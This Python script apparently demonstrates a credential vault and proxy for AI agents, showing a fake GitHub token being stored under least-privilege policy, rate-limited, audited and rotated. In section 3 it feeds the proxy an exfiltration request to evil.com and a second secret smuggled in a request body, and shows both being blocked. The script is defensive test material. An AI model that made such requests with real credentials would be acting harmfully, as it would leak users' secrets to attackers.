"""
Agent Keychain — End-to-End Lifecycle Demo
==========================================
Walks a single credential through its whole life with every protection layer
engaged, showing what gets blocked and what gets recorded. Runs entirely
locally with FAKE secrets — no real network requests are made (every request
shown here is rejected before it would leave the machine), and the demo
credential and its temp audit log are cleaned up at the end.

Run:
    python poc/demo_end_to_end.py
"""

import logging
import os
import sys
import tempfile

# Keep the demo output clean — silence the library's own log lines.
logging.disable(logging.CRITICAL)

# Route the audit log to a throwaway file BEFORE importing anything that uses it.
_AUDIT_FD, _AUDIT_PATH = tempfile.mkstemp(prefix="akc-demo-audit-", suffix=".jsonl")
os.close(_AUDIT_FD)
os.environ["AGENT_KEYCHAIN_AUDIT_LOG"] = _AUDIT_PATH

# Allow imports from the project root when run as a script.
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from agent_keychain.vault.domain_policy import host_allowed, extract_host
from agent_keychain.vault.request_scope import method_allowed, path_allowed, extract_path
from agent_keychain.guard.credential_guard import scan
from agent_keychain.guard.env_scanner import scan_environment
from agent_keychain.audit import audit_log
# Use the SAME vault instance the MCP server uses, so stored credentials are
# visible to secure_http_request (the server caches metadata in memory).
from agent_keychain.mcp_server.server import secure_http_request, vault

CRED = "demo-e2e"
FAKE_SECRET = "ghp_" + "F" * 36       # fake GitHub token (never leaves this process)
OTHER_SECRET = "ghp_" + "B" * 36      # a second secret an attacker might try to smuggle


def section(title):
    print("\n" + "=" * 68)
    print(f"  {title}")
    print("=" * 68)


def show(label, result):
    print(f"  {label}\n     -> {result}\n")


def main():
    try:
        # 1) DISCOVERY ------------------------------------------------------
        section("1. Discover secrets that live OUTSIDE the vault")
        fd, fake_file = tempfile.mkstemp(prefix="akc-demo-creds-", suffix=".env")
        with os.fdopen(fd, "w") as f:
            f.write("AWS_ACCESS_KEY_ID=AKIA" + "Z" * 16 + "\n")
        findings = scan_environment(extra_files=[fake_file], include_cwd_env=False)
        hits = [f for f in findings if f["source"] == fake_file]
        print("  `agent-keychain scan` reports location + type only, never the value:")
        for f in hits:
            print(f"     {f['count']}x {f['type']}  in  {os.path.basename(f['source'])}")
        os.remove(fake_file)

        # 2) STORE WITH FULL POLICY ----------------------------------------
        section("2. Store the credential with least-privilege policy")
        vault.store(
            CRED, FAKE_SECRET, "github",
            allowed_domains=["github.com"],
            allowed_methods=["GET"], allowed_paths=["/repos/*"],
            rate_limit_per_min=3, rotate_after_days=90,
        )
        entry = vault.get(CRED)
        print(f"  Stored '{CRED}':")
        print(f"     domains:    {', '.join(entry.allowed_domains)}")
        print(f"     scope:      methods={', '.join(entry.allowed_methods)}, paths={', '.join(entry.allowed_paths)}")
        print(f"     rate limit: {entry.rate_limit_per_min}/min")
        print(f"     rotate:     every {entry.rotate_after_days}d")

        # 3) BLOCKED REQUESTS ----------------------------------------------
        section("3. The proxy blocks misuse (no request ever leaves)")
        show("Exfil attempt to evil.com (domain binding):",
             secure_http_request(CRED, "https://evil.com"))
        show("Disallowed method DELETE (request scope):",
             secure_http_request(CRED, "https://api.github.com/repos/o/n", method="DELETE"))
        show("Out-of-scope path /users/me (request scope):",
             secure_http_request(CRED, "https://api.github.com/users/me", method="GET"))
        show("Smuggling a 2nd secret in the body (smuggling guard):",
             secure_http_request(CRED, "https://api.github.com/repos/o/n", method="GET", body=OTHER_SECRET))

        # 4) RATE LIMIT -----------------------------------------------------
        section("4. Rate limit caps how fast the token can be used")
        for _ in range(3):
            audit_log.record(CRED, "api.github.com", "GET", audit_log.ALLOWED, "ok", status=200, success=True)
        show(f"4th request within the minute (limit {entry.rate_limit_per_min}/min):",
             secure_http_request(CRED, "https://api.github.com/repos/o/n", method="GET"))

        # 5) A LEGITIMATE REQUEST PASSES EVERY GUARD ------------------------
        section("5. A legitimate request passes every guard")
        url = "https://api.github.com/repos/octocat/hello"
        checks = [
            ("domain", host_allowed(extract_host(url), entry.allowed_domains)),
            ("method", method_allowed("GET", entry.allowed_methods)),
            ("path", path_allowed(extract_path(url), entry.allowed_paths)),
            ("no smuggled secret", not scan(url)),
        ]
        for name, ok in checks:
            print(f"     {name:20} {'PASS' if ok else 'FAIL'}")
        print("\n  All guards pass -> the proxy would inject the token and send to")
        print("  api.github.com. The agent never sees the token at any point.")

        # 6) AUDIT TRAIL ----------------------------------------------------
        section("6. Everything is recorded in the audit log")
        print("  Repeated blocked attempts (probing signal):")
        for g in audit_log.summarize_blocked(min_count=1):
            hosts = f"  hosts: {', '.join(g['hosts'])}" if g["hosts"] else ""
            print(f"     {g['count']}x  [{g['reason']}]{hosts}")

        # 7) ROTATION -------------------------------------------------------
        section("7. Rotate the secret in place (metadata preserved)")
        before = vault.get(CRED).rotation_count
        vault.rotate(CRED, "ghp_" + "C" * 36)
        after = vault.get(CRED)
        print(f"  rotation_count: {before} -> {after.rotation_count}")
        print(f"  domains still bound: {', '.join(after.allowed_domains)}  (policy survives rotation)")

        print("\n" + "=" * 68)
        print("  Done. The token was never exposed, every misuse was blocked,")
        print("  and every attempt was recorded.")
        print("=" * 68)

    finally:
        vault.delete(CRED)
        if os.path.exists(_AUDIT_PATH):
            os.remove(_AUDIT_PATH)


if __name__ == "__main__":
    main()
